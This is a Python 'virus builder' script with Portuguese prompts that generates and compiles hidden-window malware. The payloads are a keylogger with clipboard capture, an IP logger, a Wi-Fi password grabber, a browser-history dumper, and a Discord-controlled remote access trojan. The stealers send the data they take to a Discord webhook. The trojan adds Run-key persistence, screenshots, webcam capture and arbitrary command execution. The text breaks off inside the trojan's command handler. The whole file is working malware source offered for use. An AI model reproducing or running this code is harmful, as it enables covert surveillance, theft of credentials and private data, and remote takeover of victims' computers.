import os
import platform
import time
from time import sleep
from colorama import Fore, Style, init
from pystyle import Colorate, Colors, Center
import sys
import subprocess
import shutil
import requests
import getpass
import uuid

# Inicialização
init(autoreset=True)

# Configuração da janela
def set_window_size(width, height):
    if platform.system() == "Windows":
        os.system(f"mode con: cols={width} lines={height}")
    else:
        os.system(f"printf '\e[8;{height};{width}t'")
        
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


banner = f'''{Fore.BLUE}
                                                             
                         ..      .:.                         
                     ..*=:        .+*-.                      
                   ..*=..          ..-*-.                    
                  .:#-.               :*+.                   
                  .#*.                 -#=                   
                  =#+.                 :##.                  
                  +#*.                 -##.                  
                  -##=.               .##*.                  
                  .*##+. :+#######=..:###-                   
                 ...*###=..:.......:*###-..                  
            ..-*###########*=:.=+############*:..            
           .*###*+=+*########+.#########*===*###*.           
         .+#*:      ...:###*.  .=###*...      .-*#=.         
        .**:.       .##..:*:.  ..=*..=#=       ..-*=.        
       .:*.         .=#=. .######+...##:         .:*:        
       .==.          .+#+. =#####:.:##:            +-        
       .=:            ..##::#####.=#*.             =-        
       ...              ...-#####....              ..        
                          .######+.                          
                         .*##*.###+.                         
           .:..      ...+###=...*###-..      ...:.           
            .:==-::-=*####-.    ..=###*=::.:-==:.            
               ..::---:..          ...:-==-:..               
{Style.RESET_ALL}                                                                
'''

menu_text = f'''{Fore.BLUE}
                                                             
                         ..      .:.                         
                     ..*=:        .+*-.                      
                   ..*=..          ..-*-.                    
                  .:#-.               :*+.                   
                  .#*.                 -#=                   
                  =#+.                 :##.                  
                  +#*.                 -##.                  
                  -##=.               .##*.                  
                  .*##+. :+#######=..:###-                   
                 ...*###=..:.......:*###-..                  
            ..-*###########*=:.=+############*:..            
           .*###*+=+*########+.#########*===*###*.           
         .+#*:      ...:###*.  .=###*...      .-*#=.         
        .**:.       .##..:*:.  ..=*..=#=       ..-*=.        
       .:*.         .=#=. .######+...##:         .:*:        
       .==.          .+#+. =#####:.:##:            +-        
       .=:            ..##::#####.=#*.             =-        
       ...              ...-#####....              ..        
                          .######+.                          
                         .*##*.###+.                         
           .:..      ...+###=...*###-..      ...:.           
            .:==-::-=*####-.    ..=###*=::.:-==:.            
               ..::---:..          ...:-==-:..               
                                                             
                                                             
{Style.RESET_ALL}
'''


def show_tool_options():
    print(f'''


                    (1) Key logger              
                    (2) Ip Logger             
                    (3) Wifi logger            
                    (4) History logger          
                    (5) Rat builder             
                    (6) requirements            


''')

def print_banner(banner_text):
    for line in banner_text.splitlines():
        print(line)
        sleep(0.05)  # Reduzido para melhor performance

def main():
    set_window_size(100, 40)
    clear_screen()
    print_banner(banner)
    sleep(2)
    clear_screen()
    print(menu_text)
    show_tool_options()

    current_username = getpass.getuser()  # Mais seguro que os.getlogin()

    while True:
        try:
            print(f"┌───────)-{Colorate.Horizontal(Colors.blue_to_cyan, f'VIRUS BUILDER(user={current_username})')}")
            choice = input("└─> ").strip().lower()

            if choice == 'exit':
                print(f"{Fore.BLUE}[EXITING]")
                break
            elif choice == '1':
                keylogger()
            elif choice == '2':
                ipgrabber()
            elif choice == '3':
                wifigrab()
            elif choice == '4':
                history()
            elif choice == '5':
                ratter()
            elif choice == '6':
                requirements_menu()
            else:
                print(f"{Fore.BLUE}[ERROR] Opção inválida: {choice}")
        except KeyboardInterrupt:
            print(f"\n{Fore.BLUE}[INTERRUPTED] Saindo...")
            break
        except Exception as e:
            print(f"{Fore.BLUE}[ERROR] {str(e)}")

def requirements_menu():  
    clear_screen()
    print(f"""
┌────────────────────────────────────┐
│       {Fore.BLUE}Requirements Installer       {Fore.BLUE}│
├────────────────────────────────────┤
│{Fore.BLUE}       Deseja instalar os           {Fore.BLUE}     │
│    {Fore.BLUE}requisitos desta ferramenta?   {Fore.BLUE}│
│                                    │
│                [{Fore.BLUE}y{Fore.BLUE}] {Fore.BLUE}Sim              {Fore.BLUE}│
│                [{Fore.BLUE}n{Fore.BLUE}] {Fore.BLUE}Não              {Fore.BLUE}│
└────────────────────────────────────┘
""")
    while True:
        choice = input("Installer └─> ").strip().lower()
        if choice == 'y':
            print("Abrindo instalador...")
            time.sleep(1)
            install_required_packages()
            break  
        elif choice == 'n':
            print("Voltando...")
            time.sleep(1)
            break
        else:
            print(f"{Fore.BLUE}Erro. Digite ({Fore.BLUE}y{Fore.BLUE}) para sim ou ({Fore.BLUE}n{Fore.BLUE}) para não")
            time.sleep(1)

def install_required_packages():
    pip_packages = [
        "pyinstaller",
        "requests",
        "pynput",
        "pywin32",
        "colorama",
        "pystyle",
        "discord.py",
        "Pillow",
        "opencv-python",
    ]

    # Verificar se pip está disponível
    try:
        subprocess.run([sys.executable, "-m", "pip", "--version"], capture_output=True, check=True)
    except subprocess.CalledProcessError:
        print(f"{Fore.BLUE}[ERRO] Pip não encontrado. Instale o Python e certifique-se que pip está no PATH.")
        return

    package_str = " ".join(pip_packages)
    
    if platform.system() == "Windows":
        command = f'start cmd /k "echo Instalando pacotes... && pip install {package_str} && echo. && echo Instalação concluída. && pause"'
    else:
        command = f'x-terminal-emulator -e "bash -c \'echo Instalando pacotes...; pip3 install {package_str}; echo; echo Instalação concluída; read -p "Pressione Enter para continuar"\'"'
    
    subprocess.run(command, shell=True)

def keylogger():
    clear_screen()
    keylogger_logo = '''\

     8 8 8 8                     ,ooo.
     8a8 8a8                    oP   ?b
    d888a888zzzzzzzzzzzzzzzzzzzz8     8b
     `""^""'                    ?o___oP'


'''
    colored_logo = Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(keylogger_logo))
    print(colored_logo)

    while True:
        webhook = input(f"\n{Fore.BLUE}└─> Digite o Webhook do Discord: ").strip()
        
        if webhook.startswith("https://discord.com/api/webhooks/") or webhook.startswith("https://discordapp.com/api/webhooks/"):
            break
        else:
            print("\nWebhook inválido")
            time.sleep(2)

    keylogger_code = f'''
import os
import time
import threading
import requests
import win32clipboard
import win32gui
from pynput import keyboard

WEBHOOK_URL = "{webhook}"
keystroke_buffer = []
last_window = ""
lock = threading.Lock()

def get_active_window_title():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

def send_embed_to_discord(text, window_title):
    if not text.strip():
        return
    embed = {{
        "title": f"Keystrokes in {{window_title}}",
        "description": text[:2000],  # Limitar tamanho
        "color": 0x0000FF,
        "footer": {{"text": f"Captured at {{time.strftime('%Y-%m-%d %H:%M:%S')}}"}}
    }}
    data = {{"embeds": [embed]}}
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

def on_press(key):
    global keystroke_buffer, last_window
    try:
        k = key.char if hasattr(key, 'char') and key.char else ''
    except:
        k = ''

    window = get_active_window_title()
    with lock:
        global last_window
        if window != last_window:
            last_window = window
            send_embed_to_discord(f"Window switched: {{window}}", window)

        if key == keyboard.Key.space:
            keystroke_buffer.append(' ')
        elif key == keyboard.Key.enter:
            text = ''.join(keystroke_buffer)
            if text:
                send_embed_to_discord(text + " [ENTER]", window)
            keystroke_buffer.clear()
        elif key == keyboard.Key.backspace:
            if keystroke_buffer:
                keystroke_buffer.pop()
        elif k:
            keystroke_buffer.append(k)

def on_release(key):
    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        try:
            win32clipboard.OpenClipboard()
            clip = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            send_embed_to_discord(f"Clipboard copied:\\n{{clip}}", "Clipboard")
        except:
            pass

def start_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    threading.Thread(target=start_listener, daemon=True).start()
    while True:
        time.sleep(10)
'''

    downloads = os.path.join(os.path.expanduser("~"), "Downloads")
    script_path = os.path.join(downloads, "built_keylogger.py")

    try:
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(keylogger_code)
        print(f"Script keylogger criado: {script_path}")
    except Exception as e:
        print(f"Erro ao criar script: {e}")
        time.sleep(3)
        return

    print("Compilando para executável...")

    pyinstaller_cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--noconsole",
        "--distpath", downloads,
        "--name", "keylogger_built",
        "--noconfirm",
        script_path
    ]

    try:
        subprocess.run(pyinstaller_cmd, check=True, capture_output=True)
        print(f"Build concluído! Arquivo salvo em: {downloads}\\keylogger_built.exe")
    except subprocess.CalledProcessError as e:
        print(f"Falha no PyInstaller: {e}")
    except Exception as e:
        print(f"Erro inesperado: {e}")

    input(Fore.BLUE + "\nPressione Enter para voltar ao menu" + Style.RESET_ALL)

def ipgrabber():
    clear_screen()
    iplogger_logo = '''
         .AMMMMMMMMMMA.
       .AV. :::.:.:.::MA.
      A' :..        : .:`A
     A'..              . `A.
    A' :.    :::::::::  : :`A
    M  .    :::.:.:.:::  . .M
    M  :   ::.:.....::.:   .M
    V : :.::.:........:.:  :V
   A  A:    ..:...:...:.   A A
  .V  MA:.....:M.::.::. .:AM.M
 A'  .VMMMMMMMMM:.:AMMMMMMMV: A
:M .  .`VMMMMMMV.:A `VMMMMV .:M:
 V.:.  ..`VMMMV.:AM..`VMV' .: V
  V.  .:. .....:AMMA. . .:. .V
   VMM...: ...:.MMMM.: .: MMV
       `VM: . ..M.:M..:::M'
         `M::. .:.... .::M
          M:.  :. .... ..M
          V:  M:. M. :M .V
          `V.:M.. M. :M.V'


'''
    colored_logo = Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(iplogger_logo))
    print(colored_logo)

    while True:
        webhook = input(f"\n{Fore.BLUE}└─> Digite o Webhook do Discord: ").strip()
        
        if webhook.startswith("https://discord.com/api/webhooks/") or webhook.startswith("https://discordapp.com/api/webhooks/"):
            break
        else:
            print(Fore.BLUE + "\nWebhook inválido" + Style.RESET_ALL)
            time.sleep(2)

    image_url = "https://media.discordapp.net/attachments/1373003383321133209/1373703388847669389/images.jpg"

    ipconfig_script = f'''
import subprocess
import requests
import time

WEBHOOK_URL = "{webhook}"

def get_ipconfig():
    try:
        return subprocess.check_output("ipconfig /all", shell=True, text=True, timeout=10)
    except Exception as e:
        return f"Erro ao executar ipconfig: {{e}}"

def get_ipinfo():
    try:
        res = requests.get("https://ipinfo.io/json", timeout=5)
        if res.status_code == 200:
            data = res.json()
            return "\\n".join([f"{{k}}: {{v}}" for k, v in data.items() if not k.startswith('readme')])
        else:
            return f"Erro ao obter informações IP: código {{res.status_code}}"
    except Exception as e:
        return f"Erro ao obter informações: {{e}}"

def send_embed(content):
    # Limitar tamanho do conteúdo
    content = content[:1900] if len(content) > 1900 else content
    embed = {{
        "title": "IP Logger Info",
        "description": "```\\n" + content + "\\n```",
        "color": 0x0000FF,
        "image": {{"url": "{image_url}"}},
        "footer": {{
            "text": "Enviado em " + time.strftime("%Y-%m-%d %H:%M:%S")
        }}
    }}
    try:
        requests.post(WEBHOOK_URL, json={{"embeds": [embed]}}, timeout=5)
    except Exception:
        pass

if __name__ == "__main__":
    ipconfig_data = get_ipconfig()
    ipinfo_data = get_ipinfo()
    combined = ipconfig_data + "\\n\\n[+] Informações IP do ipinfo.io:\\n" + ipinfo_data
    send_embed(combined)
'''

    script_filename = "ipconfig_sender.py"
    with open(script_filename, "w", encoding="utf-8") as f:
        f.write(ipconfig_script)

    print(Fore.BLUE + "\nCompilando o logger..." + Style.RESET_ALL)

    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--noconfirm", script_filename], check=True)
    except subprocess.CalledProcessError:
        print(Fore.BLUE + "ERRO: Falha no PyInstaller" + Style.RESET_ALL)
        time.sleep(3)
        return

    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    exe_name = "ipconfig_sender.exe"
    dist_path = os.path.join("dist", exe_name)
    final_path = os.path.join(downloads_path, exe_name)

    try:
        if os.path.exists(dist_path):
            shutil.move(dist_path, final_path)
            print(Fore.BLUE + f"\nLogger salvo em:\n{final_path}" + Style.RESET_ALL)
        else:
            print(Fore.BLUE + f"\nErro: {dist_path} não encontrado" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.BLUE + f"Não foi possível mover o arquivo: {e}" + Style.RESET_ALL)

    # Limpeza
    for folder in ["build", "dist", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder, ignore_errors=True)
    for file in [script_filename, "ipconfig_sender.spec"]:
        if os.path.exists(file):
            os.remove(file)

    input(Fore.BLUE + "\nPressione Enter para voltar ao menu" + Style.RESET_ALL)

def wifigrab():
    clear_screen()
    logo = '''
            @@@@@@@@@@@@@@            
        @@@@@@@@@@@@@@@@@@@@@@        
      @@@@   @@@  @@  @@@   @@@@      
    @@@@   @@@@   @@    @@@   @@@@    
   @@@    @@@     @@     @@@    @@@   
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
 @@@     @@       @@       @@     @@@ 
@@@     @@@       @@       @@@     @@@
@@@     @@        @@        @@      @@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@     @@        @@        @@      @@
@@@     @@@       @@       @@@     @@@
 @@@     @@       @@       @@     @@@ 
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  
   @@@    @@@     @@     @@@    @@@   
    @@@@   @@@    @@    @@@   @@@@    
      @@@@   @@@  @@  @@@   @@@@      
        @@@@@@@@@@@@@@@@@@@@@@        
            @@@@@@@@@@@@@@                                            
    '''
    colored_logo = Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(logo))
    print(colored_logo)

    while True:
        webhook = input(Fore.BLUE + "Digite o Webhook do Servidor: " + Style.RESET_ALL).strip()
        
        if webhook.startswith("https://discord.com/api/webhooks/") or webhook.startswith("https://discordapp.com/api/webhooks/"):
            break
        else:
            print(Fore.BLUE + "Webhook inválida" + Style.RESET_ALL)
            time.sleep(2)

    wifi_script = f'''
import subprocess
import re
import requests
import time

WEBHOOK_URL = "{webhook}"

def get_wifi_profiles():
    profiles = []
    try:
        output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, encoding='utf-8', timeout=10)
        profiles = re.findall(r"All User Profile     : (.*)", output)
    except Exception as e:
        return [f"Erro ao obter perfis: {{e}}"]
    return profiles

def get_wifi_password(profile):
    try:
        output = subprocess.check_output(f'netsh wlan show profile name="{{profile}}" key=clear', shell=True, text=True, encoding='utf-8', timeout=10)
        password_search = re.search(r"Key Content            : (.*)", output)
        if password_search:
            return password_search.group(1)
        else:
            return "(Sem senha encontrada)"
    except Exception as e:
        return f"Erro: {{e}}"

def send_to_webhook(content):
    # Limitar tamanho do conteúdo
    content = content[:1900] if len(content) > 1900 else content
    embed = {{
        "title": "Wifi Password Grabber",
        "description": content,
        "color": 0x0000FF,
        "footer": {{
            "text": "Enviado em " + time.strftime("%Y-%m-%d %H:%M:%S")
        }}
    }}
    data = {{"embeds": [embed]}}
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

if __name__ == "__main__":
    profiles = get_wifi_profiles()
    if isinstance(profiles, list) and profiles and not profiles[0].startswith("Erro"):
        message = ""
        for profile in profiles:
            pwd = get_wifi_password(profile)
            message += f"**{{profile}}** : `{{pwd}}`\\n"
    else:
        message = "\\n".join(profiles)
    send_to_webhook(message)
'''

    script_filename = "wifi_grabber.py"
    with open(script_filename, "w", encoding="utf-8") as f:
        f.write(wifi_script)

    print(Fore.BLUE + "\nCompilando o logger..." + Style.RESET_ALL)

    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--noconfirm", script_filename], check=True)
    except subprocess.CalledProcessError:
        print(Fore.BLUE + "Falha na compilação. Certifique-se de ter o PyInstaller instalado." + Style.RESET_ALL)
        time.sleep(3)
        return

    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    exe_name = "wifi_grabber.exe"
    dist_path = os.path.join("dist", exe_name)
    final_path = os.path.join(downloads_path, exe_name)

    try:
        if os.path.exists(dist_path):
            shutil.move(dist_path, final_path)
            print(Fore.BLUE + f"\nSalvo em:\n{final_path}" + Style.RESET_ALL)
        else:
            print(Fore.BLUE + f"\nErro: {dist_path} não encontrado" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.BLUE + f"Erro ao mover o executável: {e}" + Style.RESET_ALL)

    # Limpeza
    for folder in ["build", "dist", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder, ignore_errors=True)
    for file in [script_filename, "wifi_grabber.spec"]:
        if os.path.exists(file):
            os.remove(file)

    input(Fore.BLUE + "\nPressione Enter para voltar ao menu" + Style.RESET_ALL)

def history():
    clear_screen()
    chrome_logo = '''                                                                   
                                 @@@@@@@@@@@@@                                
                             @@@@@%=::...::=%@@@@@                            
                           @@@@-..:...    ...:.-@@@@                          
                         @@@@-+....          ..:::#@@@                        
                        @@@=....              ..-%*:@@@                       
                       @@@:...        .....  ....:#*:@@@                      
                      @@@-.%@@=.     .%@@@#. ....::=-:@@@                     
                      @@+.@@@@@-.   .%@@@@@%.   ..:=%:#@@                     
                     @@@:-@@@@@*.   =@@@@@@@:     .:=:=@@@                    
                     @@@.-@@@@@*.   -@@@@@@@:     .:::-@@@                 
                     @@@..@@@@@..   .%@@@@@#..    .::-=@@@               
                     @@@:..%@%:.:+-...+@@@=..-..  ..---@@@                   
                    @@@@:      -@@@#.      .:%     .---%@@              
                @@@@@#@@:     .@@@@@:.    .-@*  .. .::-=@@@@             
              @@@@#=-=@@:..   .@@@@@-.   .#@*.  ... ..:::+@@@@@@              
             @@%:-..:#@%...   .%@@@@..  .@@*.  ..::......=+:=#@@@@            
            @@@-...-=@@= ..    .@@@+.   -@@-   .:*@=:.   ..+*..#@@            
             @@@+++*%@#. :..   ......   .#@@*==*@@@##=::......::@@@           
              @@@@@@@@-  -:.    ...  ....:=%@@@@%+====--::::::-#@@            
                  @@@+...+*.    ... ...=..:-======-:-===***##@@@@@            
                  @@%. .:+%..*:. .:....=*.::=====-:::--#@@@@@@@               
                  @@%:::-*@..:....::....*-.:-=====-:::--+@@@               
                  @@@*=+%@@..%:...::........::=+%#+=-:--=%@@               
                   @@@@@@@@:.%:..::::..::::..::#@@@@*=--=@@@                  
                    @@@ %@@=. ..:-+-::..::+=--=%@@@@@@@@@@@@                  
                         @@@-:::+@@@-:..:-%@@@@@@@@@@                     
                          @@@@@@@@@@*:::.:*@@@@   @@@                      
                           @@@@@ @@@-::::*@@                       
                                  @@%=--+@@@                              
                                    @@@@@@@@                                  
                                                                       
                                                                              
'''
    print(Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(chrome_logo)))

    while True:
        webhook = input(Fore.BLUE + "\nDigite o Webhook do Discord: " + Style.RESET_ALL).strip()
        
        if webhook.startswith("https://discord.com/api/webhooks/") or webhook.startswith("https://discordapp.com/api/webhooks/"):
            break
        print(Fore.BLUE + "\nWebhook inválida" + Style.RESET_ALL)
        time.sleep(2)

    script_code = fr'''
import os
import sqlite3
import shutil
import requests
import tempfile

WEBHOOK_URL = "{webhook}"

def send_file_to_webhook(file_path):
    try:
        with open(file_path, "rb") as f:
            filename = os.path.basename(file_path)
            files = {{
                "file": (filename, f)
            }}
            response = requests.post(WEBHOOK_URL, files=files, timeout=10)
            if response.status_code == 204:
                print("[+] Enviado para o webhook")
            else:
                print(f"[-] Falha ao enviar: {{response.status_code}}")
    except Exception as e:
        print(f"[-] Exceção ao enviar arquivo: {{e}}")

def dump_history_from_db(history_path, browser_name):
    if not os.path.exists(history_path):
        print(f"[-] Arquivo de histórico do {{browser_name}} não encontrado")
        return None

    temp_file = tempfile.NamedTemporaryFile(delete=False)
    temp_history = temp_file.name
    temp_file.close()
    shutil.copy2(history_path, temp_history)

    conn = sqlite3.connect(temp_history)
    cursor = conn.cursor()

    query = "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20"

    history_lines = []
    try:
        cursor.execute(query)
        results = cursor.fetchall()
        for url, title in results:
            if url:
                history_lines.append(url)
    except Exception as e:
        print(f"[-] Erro ao ler histórico do {{browser_name}}: {{e}}")
    finally:
        cursor.close()
        conn.close()
        os.remove(temp_history)

    return history_lines

def dump_firefox_history():
    user_profile = os.environ.get("USERPROFILE")
    places_path = os.path.join(user_profile, r"AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
    if not os.path.exists(places_path):
        print("[-] Pasta de perfis do Firefox não encontrada.")
        return None

    profiles = [d for d in os.listdir(places_path) if os.path.isdir(os.path.join(places_path, d))]
    if not profiles:
        print("[-] Nenhum perfil do Firefox encontrado.")
        return None

    history_lines = []
    for profile in profiles:
        history_db = os.path.join(places_path, profile, "places.sqlite")
        if not os.path.exists(history_db):
            continue

        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_history = temp_file.name
        temp_file.close()
        shutil.copy2(history_db, temp_history)

        try:
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            query = "SELECT url, title FROM moz_places ORDER BY last_visit_date DESC LIMIT 20"
            cursor.execute(query)
            results = cursor.fetchall()
            for url, title in results:
                if url:
                    history_lines.append(url)
            cursor.close()
            conn.close()
        except Exception as e:
            print(f"[-] Erro ao ler histórico do Firefox: {{e}}")
        finally:
            os.remove(temp_history)

    return history_lines if history_lines else None

def main():
    user_profile = os.environ.get("USERPROFILE")

    history_all = []

    chrome_path = os.path.join(user_profile, r"AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")
    chrome_history = dump_history_from_db(chrome_path, "Chrome")
    if chrome_history:
        history_all.extend(chrome_history)

    edge_path = os.path.join(user_profile, r"AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History")
    edge_history = dump_history_from_db(edge_path, "Edge")
    if edge_history:
        history_all.extend(edge_history)

    firefox_history = dump_firefox_history()
    if firefox_history:
        history_all.extend(firefox_history)

    if not history_all:
        print("[-] ERRO: NENHUM HISTÓRICO ENCONTRADO")
        return

    output_file = "browser_history_dump.txt"
    with open(output_file, "w", encoding="utf-8") as f:
        for url in history_all:
            f.write(url + "\\n")

    print(f"[+] Histórico exportado para {{output_file}}. Enviando para o webhook")
    send_file_to_webhook(output_file)

    if os.path.exists(output_file):
        os.remove(output_file)

if __name__ == "__main__":
    main()
'''

    filename = "browser_history_dumper.py"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(script_code)

    print(Fore.BLUE + "\nCriando logger de histórico..." + Style.RESET_ALL)
    try:
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--noconfirm", filename], check=True)
    except subprocess.CalledProcessError:
        print(Fore.BLUE + "ERRO: Falha no PyInstaller" + Style.RESET_ALL)
        time.sleep(3)
        return

    downloads_path = os.path.join(os.path.expanduser("~"), "Downloads")
    exe_name = "browser_history_dumper.exe"
    dist_path = os.path.join("dist", filename.replace(".py", ".exe"))
    final_path = os.path.join(downloads_path, exe_name)

    try:
        if os.path.exists(dist_path):
            shutil.move(dist_path, final_path)
            print(Fore.BLUE + f"\nPronto! Arquivo salvo em:\n{final_path}" + Style.RESET_ALL)
        else:
            print(Fore.BLUE + f"\nErro: {dist_path} não encontrado" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.BLUE + f"ERRO: Falha ao mover o arquivo — {e}" + Style.RESET_ALL)

    # Limpeza
    for folder in ["build", "dist", "__pycache__"]:
        if os.path.exists(folder):
            shutil.rmtree(folder, ignore_errors=True)
    for file in [filename, filename.replace(".py", ".spec")]:
        if os.path.exists(file):
            os.remove(file)

    input(Fore.BLUE + "\nPressione Enter para voltar ao menu" + Style.RESET_ALL)

def ratter():
    clear_screen()
    
    print(f'''
┌───────────────────────────────────────────────┐
│          {Fore.BLUE}⚠ {Fore.BLUE}Como usar o RAT {Fore.BLUE}⚠                 │
├───────────────────────────────────────────────┤
│                                               │
│ 1. Acesse discord.com/developers/applications │
│ 2. Clique em "New Application"                │
│ 3. Dê um nome ao bot                          │
│ 4. Vá para a seção OAuth2                     │
│ 5. Selecione as permissões: Bot e Administrator│
│ 6. Copie a URL gerada e guarde                │
│ 7. Ative as intents no menu do bot:           │
│    - Presence Intent                          │
│    - Server Members Intent                    │
│    - Message Content Intent                   │
│ 8. Ative as permissões de administrador       │
│ 9. Copie o token do bot e guarde              │
│ 10. Convide o bot para seu servidor           │
└───────────────────────────────────────────────┘
''')

    token = input("\nDigite o Token do seu Bot: ").strip()

    if not token or len(token) < 50:
        print(Fore.BLUE + "Token inválido" + Style.RESET_ALL)
        time.sleep(2)
        return

    bot_script = f'''
import discord
import asyncio
import os
import subprocess
import requests
from PIL import ImageGrab
import tempfile
import sys

# Tentar importar cv2, mas não falhar se não estiver disponível
try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

if os.name == "nt":
    try:
        import winreg
        HAS_WINREG = True
    except ImportError:
        HAS_WINREG = False

TOKEN = "{token}"

def add_to_startup():
    if os.name != "nt" or not HAS_WINREG:
        return
    try:
        exe_path = sys.executable
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "DiscordBotClient", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"Falha ao adicionar à inicialização: {{e}}")

add_to_startup()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Bot conectado como {{client.user}}')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    content = message.content.strip()
    content_lower = content.lower()
    local_username = os.getenv("USERNAME") or os.getenv("USER") or "Unknown User"

    if content_lower == "!help":
        embed = discord.Embed(
            title="Comandos do RAT",
            description=(
                "**!help** - Mostra esta mensagem\\n"
                "**!clients** - Mostra todos os clientes infectados\\n"
                "**!ip <username>** - Obtém informações de IP\\n"
                "**!screenshot <username>** - Tira screenshot\\n"
                "**!webcam <username>** - Captura webcam (requer OpenCV)\\n"
                "**!cmd <username> <command>** - Executa comando no PC"
            ),
            color=discord.Color.blue()
        )
        await message.channel.send(embed=embed)

    elif content_lower == "!clients":
        await message.channel.send(f"Cliente: `{{local_username}}`")

    elif content_lower.startswith("!ip"):
        parts = content.split()
        if len(parts) == 1:
            await message.channel.send("Uso: `!ip <username>`")
            return

        requested_username = parts[1]
        if requested_username.lower() != local_username.lower():
            await message.channel.send(f"Erro: Cliente '{{requested_username}}' não encontrado.")
            return

        try:
            ipconfig_output = subprocess.check_output("ipconfig /all", shell=True, text=True, timeout=5)
        except Exception as e:
            ipconfig_output = f"Falha ao executar ipconfig /all: {{e}}"

        try:
            res = requests.get("https://ipinfo.io/json", timeout=5)
            if res.status_code == 200:
                ipinfo = res.json()
                ipinfo_str = "\\n".join([f"{{k}}: {{v}}" for k,v in ipinfo.items() if not k.startswith('readme')])
            else:
                ipinfo_str = f"Falha ao obter informações IP: {{res.status_code}}"
        except Exception as e:
            ipinfo_str = f"Erro ao obter ipinfo: {{e}}"

        embed = discord.Embed(
            title=f"Informações de IP - {{local_username}}",
            description=f"**IPCONFIG:**\\n```{{ipconfig_output[:1000]}}```\\n**IPINFO.IO:**\\n```{{ipinfo_str[:1000]}}```",
            color=discord.Color.blue()
        )
        await message.channel.send(embed=embed)

    elif content_lower.startswith("!screenshot"):
        parts = content.split()
        if len(parts) == 1:
            await message.channel.send("Uso: `!screenshot <username>`")
            return

        requested_username = parts[1]
        if requested_username.lower() != local_username.lower():
            await message.channel.send(f"Erro: Cliente '{{requested_username}}' não encontrado.")
            return

        try:
            screenshot = ImageGrab.grab()
            with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp_file:
                screenshot_path = tmp_file.name
                screenshot.save(screenshot_path)

            embed = discord.Embed(
                title=f"Screenshot de {{local_username}}",
                color=discord.Color.blue()
            )
            embed.set_image(url="attachment://screenshot.png")

            with open(screenshot_path, "rb") as img_file:
                await message.channel.send(embed=embed, file=discord.File(img_file, filename="screenshot.png"))

            os.remove(screenshot_path)

        except Exception as e:
            await message.channel.send(f"ERRO ao tirar screenshot: {{e}}")

    elif content_lower.startswith("!webcam"):
        if not HAS_CV2:
            await message.channel.send("ERRO: OpenCV não está instalado. Função de webcam indisponível.")
            return
            
        parts = content.split()
        if len(parts) == 1:
            await message.channel.send("Uso: `!webcam <username>`")
            return

        requested_username = parts[1]
        if requested_username.lower() != local_username.lower():
            await message.channel.send(f"Erro: Cliente '{{requested_username}}' não encontrado.")
            return

        try:
            cap = cv2.VideoCapture(0)
            
            if not cap.isOpened():
                await message.channel.send("Webcam não encontrada ou sem acesso")
                return
                
            ret, frame = cap.read()
            if not ret:
                await message.channel.send("Falha ao capturar imagem da webcam")
                return
                
            with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as tmp_file:
                webcam_path = tmp_file.name
                cv2.imwrite(webcam_path, frame)
                
            cap.release()

            embed = discord.Embed(
                title=f"Captura de Webcam - {{local_username}}",
                color=discord.Color.blue()
            )
            embed.set_image(url="attachment://webcam.jpg")

            with open(webcam_path, "rb") as img_file:
                await message.channel.send(embed=embed, file=discord.File(img_file, filename="webcam.jpg"))

            os.remove(webcam_path)

        except Exception as e:
            await message.channel.send(f"ERRO ao capturar webcam: {{e}}")

    elif content_lower.startswith("!cmd"):
        parts = content.split()
        if len(parts) < 3:
            await message.channel.send("Uso: `!cmd <username> <comando>`")
            return

        requested_username = parts[1]
        if requested_username.lower() != local_username.lower():
            await message.channel.send(f"Erro: Cliente '{{requested_username}}' não encontrado.")
            return

        cmd_to_run = " ".join(parts[2:])
        try:
            output = subprocess.check_output(cmd_to_run, shell=True, text=True, timeout=10)
            if not output.strip():
                output = "(Sem saída)"
            if len(output) > 1500:
